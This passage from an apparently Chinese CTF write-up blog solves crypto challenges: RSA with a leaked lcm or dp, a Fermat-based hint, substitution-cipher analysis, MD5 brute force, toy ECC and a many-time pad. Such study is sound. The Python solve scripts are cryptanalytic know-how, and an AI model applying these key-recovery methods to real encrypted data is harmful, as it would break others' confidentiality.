12014390407577411901073023343605156838085352100072626795419499170663485779999037217620743618345438410436640793126730009779658075333969676742155094907812791046890808772719482409624140530544089398083987294015262116789585647737347545201626256761237122538181845765153819934984033108540608111054285540021407135685951454515726603264741335464541973732200528002195925123036156882722178448292502172108479605019500853738629753443673463827579065466251031625723254330536231222555319502433107527666113448885915540170500390748269155329503405206639262560938921421043312021946375465454663406709573731891390658809086920987126966055505</span><br><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>gift=p-1和q-1的最小公倍数，可知gift=(p-1)*(q-1)//gcd(p-1,q-1)=&gt;phi=gift*gcd(p-1,q-1)</p><p>n//gift不大，可知gcd可爆破，爆破gcd(p-1,q-1)，求每一次的phi对应的d,看解密结果，直到出flag</p><p>这里还有一个问题是e与phi不互素，因为e是偶数，这里可以将公钥看成e//2,加密密文m^2,将得到的结果开发可得到m</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br> <br>n=<span class="hljs-number">13664620234268901160055157247810665534349606023583951420372422169980992482998282536609067846401224024893066810784542670052707748948158449361132096680752338924381061874032410822445466886973939158230664282005372981552891918244652335988091160966855312167853338112228528219379964882771499536900048185888146415807593225500175392699331500194180680998666327780919649132702014011099987148622347120192850640457559883941134333727953211765174494834095911596551947418012849825730886258560864450424104967263344231516697424438684502027180505170641536099213842597878883033558282380085962932092759358698239326823009982345606749664091</span><br>gift=<span class="hljs-number">1366462023426890116005515724781066553434960602358395142037242216998099248299828253660906784640122402489306681078454267005270774894815844936113209668075233892438106187403241082244546688697393915823066428200537298155289191824465233598809116096685531216785333811222852821937996488277149953690004818588814641580735290146084660706449913291537470699789021589215478593372364630200882723709027811226070626400160397860596521904137974856987602831701814180202522608228505910412389032159081877001557604329433230532473043077795526030613329256349472056374011129705595257285454877937498732149500869239439008656105244829186841725600</span><br>c=<span class="hljs-number">12014390407577411901073023343605156838085352100072626795419499170663485779999037217620743618345438410436640793126730009779658075333969676742155094907812791046890808772719482409624140530544089398083987294015262116789585647737347545201626256761237122538181845765153819934984033108540608111054285540021407135685951454515726603264741335464541973732200528002195925123036156882722178448292502172108479605019500853738629753443673463827579065466251031625723254330536231222555319502433107527666113448885915540170500390748269155329503405206639262560938921421043312021946375465454663406709573731891390658809086920987126966055505</span><br>e = <span class="hljs-number">54722</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(n)))<span class="hljs-comment">#用于判断判断gcd的大小</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(gift)))<br> <br>e=e//<span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n//gift):<br>    phi=gift*i<br>    <span class="hljs-keyword">try</span>:<br>        d=gmpy2.invert(e,phi)<br>        m=gmpy2.powmod(c,d,n)<br>        m=libnum.n2s(<span class="hljs-built_in">int</span>(gmpy2.iroot(m,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(m)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="4-Fermat"><a href="#4-Fermat" class="headerlink" title="4.Fermat"></a>4.Fermat</h2><p>描述：Fermat 小定理</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> *<br>m=bytes_to_long(flag)<br>e=<span class="hljs-number">0x10001</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>hint = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2023</span> * p + <span class="hljs-number">2022</span>, q, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint=&#x27;</span>,hint)<br><span class="hljs-comment"># c= 7550864452885070096496562797270254336677378336181432638968145290972751510614877604530530732043518275830737451293778954740228908605271105441023659376245492943605660132874048503089026768686355298736229009420115702007651651229851869741200712803957711271232420543984773830429919369913921445512522520554763635780923279529727494862919620528143245324951673279427044704185708830579734179651197665065992892865528719633328926366945251850993402050409361227962933486157308660242415791799938811967083174599113144871747348255057506531107770494912816624972151425303188315053924014392533773484553098258150848018443311010473381568407</span><br><span class="hljs-comment"># n= 14785635450731706053564298427792102431379992871267142373019784384926691841002923589372902474510049654307380477777914338661103357309249937178392323374934696089303936756771691782780810428632542675221007265946071796749257330883539692450822896625510418914645912097361500197240741228066944491633086907673661017247094783691665140113427926920699563831298710846478780185612423384024882005487557054547410824069124644044053041088220977128981180852335201834495991715160909800906100937781877149973104640934386353412739578358609863364869917600456250936274791395989626596627934262273072130229829884617867207247974885351653593454513</span><br><span class="hljs-comment"># hint= 6301401746117913463039591606188749801841336567870459911476666302884988770530360131770134987916381205983452495146028736259433282063617013611781632051814839721777669075033280075881091945241444920690903833567212973401166029755665170453402927106089103405884731461103413733954009666797572210801521669153031456508502879193405194269187176793440226940611962736089326074285933179919665121024267796116775577440452757228496096163090040272972974066067855238162386581215738663417844544916955287159440343658537376909154684974102260265345671050392576668965042454467916675555327099725223205652709711209622475786885271108898327060404</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>一开始不知怎么出来，看了一博客，一般是p,q的次方组成的hint可以尝试模p或者模q分析</p><p>已知：</p><script type="math/tex; mode=display">hint\equiv(2023*p+2022)^q(mod n)</script><p>分析中用到的公式</p><script type="math/tex; mode=display">a^p\equiv{a}(modp)\text{费马小定理}</script><p>模q分析：</p><script type="math/tex; mode=display">hint\equiv(2023*p+2022)^q\equiv2023*p+2022(modq)</script><p>模p分析：</p><script type="math/tex; mode=display">hint\equiv(2023*p+2022)^q\equiv2022^q\equiv(2022^q)^p\equiv2022^N(modp)</script><script type="math/tex; mode=display">hint-2022^N\equiv0(modp)</script><script type="math/tex; mode=display">hint-2022^N=k*p</script><script type="math/tex; mode=display">N=p*q</script><script type="math/tex; mode=display">p=gcd(hint-2022^N\%N,N)</script><p>注意2022^N要模上N，不然N次数太大，难以计算</p><p>只羊能求出p,n//p能求q,之后rsa正常解就行</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">14785635450731706053564298427792102431379992871267142373019784384926691841002923589372902474510049654307380477777914338661103357309249937178392323374934696089303936756771691782780810428632542675221007265946071796749257330883539692450822896625510418914645912097361500197240741228066944491633086907673661017247094783691665140113427926920699563831298710846478780185612423384024882005487557054547410824069124644044053041088220977128981180852335201834495991715160909800906100937781877149973104640934386353412739578358609863364869917600456250936274791395989626596627934262273072130229829884617867207247974885351653593454513</span><br>c = <span class="hljs-number">7550864452885070096496562797270254336677378336181432638968145290972751510614877604530530732043518275830737451293778954740228908605271105441023659376245492943605660132874048503089026768686355298736229009420115702007651651229851869741200712803957711271232420543984773830429919369913921445512522520554763635780923279529727494862919620528143245324951673279427044704185708830579734179651197665065992892865528719633328926366945251850993402050409361227962933486157308660242415791799938811967083174599113144871747348255057506531107770494912816624972151425303188315053924014392533773484553098258150848018443311010473381568407</span><br>hint = <span class="hljs-number">6301401746117913463039591606188749801841336567870459911476666302884988770530360131770134987916381205983452495146028736259433282063617013611781632051814839721777669075033280075881091945241444920690903833567212973401166029755665170453402927106089103405884731461103413733954009666797572210801521669153031456508502879193405194269187176793440226940611962736089326074285933179919665121024267796116775577440452757228496096163090040272972974066067855238162386581215738663417844544916955287159440343658537376909154684974102260265345671050392576668965042454467916675555327099725223205652709711209622475786885271108898327060404</span><br>e = <span class="hljs-number">65537</span><br>kp = hint-<span class="hljs-built_in">pow</span>(<span class="hljs-number">2022</span>,n,n)<br>p = gmpy2.gcd(n,kp)<br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="5-Single"><a href="#5-Single" class="headerlink" title="5.Single"></a>5.Single</h2><p>描述：Single Table , 得到的flag去掉空格，字母小写按照flag{}格式提交</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> text<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters <span class="hljs-comment">#ascii_letters为56个小写加大写英文字母</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">single_tsub</span>(<span class="hljs-params">txt</span>):<br>    tb=<span class="hljs-built_in">list</span>(ascii_letters[<span class="hljs-number">26</span>:])<span class="hljs-comment">#ascii_letters[26:]为AB~Z</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(tb)==<span class="hljs-number">26</span><br>    shuffle(tb)<span class="hljs-comment">#打乱列表</span><br>    <span class="hljs-built_in">print</span>(tb)<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt)):<br>        ans+=tb[<span class="hljs-built_in">ord</span>(txt[i])-<span class="hljs-number">65</span>]<br>    <span class="hljs-keyword">return</span> ans<br><span class="hljs-built_in">print</span>(single_tsub(text))<br><span class="hljs-comment">#OAIAWEVLYITLZDVQIDOICCTLZTLOHOAITLBHQEVOTHLDHUTIOROAITLBHQEVOTHLTLXWDOQRXIFIKHCDFIQRQVCTXKRDHXHOAIAVUMIQDOQTUMCKVRTLZOIILDINCKHQTLZUATKXQILBQVWXDOIQDVLXDIQTHWDSATOIZUHKKVQUQTETLVKDOAWDTLBHQEVOTHLDIUWQTORYIUHEIDVLTECILXTLZTECHQOVLOTDDWIBKVZTDRHWYQIVMDTLZKIOVYKIQICKVUIEILO</span><br></code></pre></td></tr></table></figure><p>分析：</p><p>由于密文没有分句，用自己的模式匹配的脚本做不了</p><p>最后发现了一个在线分析网站</p><p>步骤：</p><p><a href="http://www.chaos.org.uk/~eddy/craft/substitute.html">http://www.chaos.org.uk/~eddy/craft/substitute.html</a></p><p>用这个网站可以快速统计字母次数，也能进行替换</p><p>分析结果：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191541996.png" alt="image-20221119154143954"></p><p>英语中字母频率</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191544301.png" alt="img"></p><p>由此可以猜测I对应E,可以对着进行猜测，最后我个人感觉密文前三个字母对应THE的概率较大(最后确实是)，但是发现之后找到的一个网站不用加这个线索也能跑出来</p><p><a href="https://quipqiup.com/">https://quipqiup.com/</a></p><p>直接放密文进去跑，也可以加线索</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191549699.png" alt="image-20221119154948645"></p><p>结果为：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191550362.png" alt="image-20221119155015332"></p><h2 id="6-Repair-md5"><a href="#6-Repair-md5" class="headerlink" title="6.Repair md5"></a>6.Repair md5</h2><p>描述：缺失的md5，你能还原他的原貌吗，flag提交flag{还原的md5}</p><p>题目：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">？表示未知位，通过残缺的信息你能还原明文消息吗?<br><br>残缺的明文消息: <span class="hljs-variable constant_">TASC</span>?<span class="hljs-variable constant_">O3RJMV</span>?<span class="hljs-variable constant_">WDJKX</span>?<span class="hljs-variable constant_">ZM</span><br>明文的<span class="hljs-symbol">md5:</span> e9032?<span class="hljs-string">??</span>da?<span class="hljs-string">??</span>08?<span class="hljs-string">??</span><span class="hljs-string">?9</span>11513?<span class="hljs-number">0</span>?<span class="hljs-string">??</span>a2<br><br>flag格式 flag&#123;还原出的hash值&#125;<br></code></pre></td></tr></table></figure><p>思路：就是爆破（hash碰撞）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>            m = hashlib.md5()  <span class="hljs-comment"># 获取一个md5加密算法对象</span><br>            <span class="hljs-comment">#TASC?O3RJMV?WDJKX?ZM</span><br>            m.update(<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;TASC&#x27;</span> + <span class="hljs-built_in">chr</span>(i) +<span class="hljs-string">&#x27;O3RJMV&#x27;</span>+ <span class="hljs-built_in">chr</span>(j) + <span class="hljs-string">&#x27;WDJKX&#x27;</span>+<span class="hljs-built_in">chr</span>(z)+<span class="hljs-string">&#x27;ZM&#x27;</span>).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))  <span class="hljs-comment"># 指定需要加密的字符串</span><br>            des = m.hexdigest()<br>            <span class="hljs-comment">#e9032???da???08????911513?0???a2</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;e9032&#x27;</span> <span class="hljs-keyword">in</span> des <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;da&#x27;</span> <span class="hljs-keyword">in</span> des <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;08&#x27;</span> <span class="hljs-keyword">in</span> des <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;911513&#x27;</span> <span class="hljs-keyword">in</span> des <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;a2&#x27;</span> <span class="hljs-keyword">in</span> des :  <span class="hljs-comment"># 如果得到的密文和我们预期的密文相同，输出</span><br>                <span class="hljs-built_in">print</span>(des)<br></code></pre></td></tr></table></figure><h2 id="7-dpLeak"><a href="#7-dpLeak" class="headerlink" title="7.dpLeak"></a>7.dpLeak</h2><p>描述：</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">assert</span> gp.gcd(p,q)==<span class="hljs-number">1</span><br>e=<span class="hljs-number">0x10001</span><br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>dp=d%(p-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dp=&#x27;</span>,dp)<br>m=bytes_to_long(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,<span class="hljs-built_in">pow</span>(m,e,n))<br><span class="hljs-comment"># dp= 147950742489048919767383328636358737689406437794616897916631817652709979867210516204886049801551809698100745650580009405792626796445019654718113006618804088030067685607819059174917602445986372846317956915276050060948539460289990285334179298498808507063054089944061436850096057044115092804920113725522912486803</span><br><span class="hljs-comment"># n= 27746091032221639088930633008116535411471196260566049135008975317495139117845843307431074917656574376862117202106011475087561240843521164522370138438410772238997869321360270022350538717229247389877145177513495372489446297221138485187676833448102190488328420274227260458093964555922080606303673970923602914046665424958929076256781183285999435238234724792213870127447413473764089707512017575358177426152580753770745042063615938986729117917925020861709659626379880199751077165202388135008494283445817247454469155161572834096605188399680408432356527844004988420679124093681692783137984433310412943819555840418241360695207</span><br><span class="hljs-comment"># c= 17693622302573412487325107028893619713899821803805703784951619475792827748921318491042639005517821920557077610567966794394727297816601776506769813027036428877614939925367749750876775775620246105529612195217095632735557464288020345062627001638672494049504372314697222719368424261694506444063007296129463500581294915074866363364934487330076348204608040353119954109594046127659056300003874071300270514389592508587319090091018461851877131676575862793801467030489929317303761729134738520118713271058177155521050532041585822443674662681774326342661003671270798391626724305330135625028815515245220464820271784951083812864799</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>已知e,dp,n,求p</p><p>推导：</p><script type="math/tex; mode=display">dp\equiv{d}(mod(p-1))\\dp*e\equiv{e*d}(mod(p-1))\\e*d=dp*e+k*(p-1)\\e*d\equiv1(mod\phi(n))\\dp*e+k*(p-1)\equiv1(mod\phi(n))\\dp*e+k*(p-1)=k_2(p-1)(q-1)+1\\(k_2*(q-1)-k)(p-1)=dp*e-1\\x=k_2*(q-1)-k\\x(p-1)=dp*e-1\\p=(dp*e-1)//x+1</script><p>x(p-1)=dp<em>e-1 由于p-1&gt;dp，所以x&lt;e,x的范围为(0,e)，可以爆破，得到的p能被n整除即为正确的p，前面还可以验证一下dp\</em>e%x==0</p><p>p求出来之后的就没问题了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>dp= <span class="hljs-number">147950742489048919767383328636358737689406437794616897916631817652709979867210516204886049801551809698100745650580009405792626796445019654718113006618804088030067685607819059174917602445986372846317956915276050060948539460289990285334179298498808507063054089944061436850096057044115092804920113725522912486803</span><br>n= <span class="hljs-number">27746091032221639088930633008116535411471196260566049135008975317495139117845843307431074917656574376862117202106011475087561240843521164522370138438410772238997869321360270022350538717229247389877145177513495372489446297221138485187676833448102190488328420274227260458093964555922080606303673970923602914046665424958929076256781183285999435238234724792213870127447413473764089707512017575358177426152580753770745042063615938986729117917925020861709659626379880199751077165202388135008494283445817247454469155161572834096605188399680408432356527844004988420679124093681692783137984433310412943819555840418241360695207</span><br>c= <span class="hljs-number">17693622302573412487325107028893619713899821803805703784951619475792827748921318491042639005517821920557077610567966794394727297816601776506769813027036428877614939925367749750876775775620246105529612195217095632735557464288020345062627001638672494049504372314697222719368424261694506444063007296129463500581294915074866363364934487330076348204608040353119954109594046127659056300003874071300270514389592508587319090091018461851877131676575862793801467030489929317303761729134738520118713271058177155521050532041585822443674662681774326342661003671270798391626724305330135625028815515245220464820271784951083812864799</span><br>e=<span class="hljs-number">0x10001</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>p=(dp*e-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> gp.gcd(p,n)!=<span class="hljs-number">1</span>:<br><span class="hljs-keyword">break</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="8-ezECC"><a href="#8-ezECC" class="headerlink" title="8.ezECC"></a>8.ezECC</h2><p>描述：easyECC，but you need to use sagemath ; )</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>m=bytes_to_long(flag)<br>E=EllipticCurve(GF(p),[a,b])<br>G=E.lift_x(<span class="hljs-number">328774185739762235670476988635186</span>)<br>k=getPrime(<span class="hljs-number">48</span>)<br>P=k*G<br>r=getPrime(<span class="hljs-number">48</span>)<br>C1=r*G<br>C2=r*P<br>x,y=<span class="hljs-built_in">int</span>(C2[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(C2[<span class="hljs-number">1</span>])<br>C=x*m+y<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C1=&#x27;</span>,C1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k=&#x27;</span>,k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C=&#x27;</span>,C)<br><span class="hljs-comment"># C1= (13548489980562913393460136600495770854798847580803219074852872954316906728536 : 42847243358924904169108426599781124218459033742831410121120795293065368845261 : 1)</span><br><span class="hljs-comment"># k= 256361570086183</span><br><span class="hljs-comment"># C= 1406361915906653619905439093970614025709937400683080933785369589269700403931952965978649301019111410504630648110554709837621266771661782460983582036109487644636517088059170847030</span><br></code></pre></td></tr></table></figure><p>思路：</p><script type="math/tex; mode=display">C_2=r*P=r*k*G=k*C_1</script><p>k,C1已知能求出C2,C2知道能得到x,y，再加上已知C,m=(C-y)//x  可以求出m</p><p>exp:</p><p>在sagemath上运行得到m的int型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>E=EllipticCurve(GF(p),[a,b])<br>G=E.lift_x(<span class="hljs-number">328774185739762235670476988635186</span>)<br>C1=E(<span class="hljs-number">13548489980562913393460136600495770854798847580803219074852872954316906728536</span>,<span class="hljs-number">42847243358924904169108426599781124218459033742831410121120795293065368845261</span>)<br>C= <span class="hljs-number">1406361915906653619905439093970614025709937400683080933785369589269700403931952965978649301019111410504630648110554709837621266771661782460983582036109487644636517088059170847030</span><br>k= <span class="hljs-number">256361570086183</span><br>P=k*G<br>C2=k*C1<br>x,y=<span class="hljs-built_in">int</span>(C2[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(C2[<span class="hljs-number">1</span>])<br>m=(C-y)/x<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191720012.png" alt="image-20221119172051914"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<span class="hljs-number">56006392793430012575325753982107877602722976190452482406163406120554773657970195585690086252788070781</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="9-Weak-OTP"><a href="#9-Weak-OTP" class="headerlink" title="9.Weak OTP"></a>9.Weak OTP</h2><p>描述：OTP理论上是不可破解的，但使用者并不会频繁更换key。根据密文还原出key，提交flag{key}， 如果你求出的key为123456则提交flag{123456}</p><p>题目：只给了密文</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3d</span>100e10522313020a00015849390d191244071c0e<span class="hljs-number">06453a5354</span><br><span class="hljs-number">17110</span>a1001110e040b4e080d49000c0315051810<span class="hljs-number">43020b175354</span><br><span class="hljs-number">0</span>a100b423d0b044b1b070811491d041441011d16111a15071a4e<br><span class="hljs-number">17551</span>c011a000c0e434e2c54010804020544071d0<span class="hljs-number">217451a0701</span><br><span class="hljs-number">10064</span>f161a00410401021c540c0306021814071c0c0d<span class="hljs-number">451e1655</span><br><span class="hljs-number">111</span>a0b42060d001f4f071654040c1118040912010a<span class="hljs-number">00041f1f58</span><br><span class="hljs-number">59051d</span>0d04000f4b1b0145160c4d0b1f15441007<span class="hljs-number">02000e161701</span><br><span class="hljs-number">1</span>c030a10520c074b1b06005402081c500817531e0<span class="hljs-number">61311530044</span><br><span class="hljs-number">1</span>a001d075e452d0e1b4e281149060b1f16441a13431a<span class="hljs-number">0a065340</span><br><span class="hljs-number">1</span>e070a075212081f074e081149190a5014171655170b<span class="hljs-number">0c005344</span><br><span class="hljs-number">17161d</span>1b02110804014e16170108081541051f02021a165d5d0f<br></code></pre></td></tr></table></figure><p>思路：</p><p><a href="https://www.ruanx.net/many-time-pad/">https://www.ruanx.net/many-time-pad/</a> 这一篇博客写的很详细了</p><p>这是由于不更换密钥，导致的安全性问题。</p><p>Alice 造一个比较长的密钥，然后用非常秘密的方式告诉 Bob. 接下来，Alice 每次向 Bob 发送信息，都把明文异或上这个约定好的字符串；Bob 收到信息之后，把密文异或上 <code>key</code>, 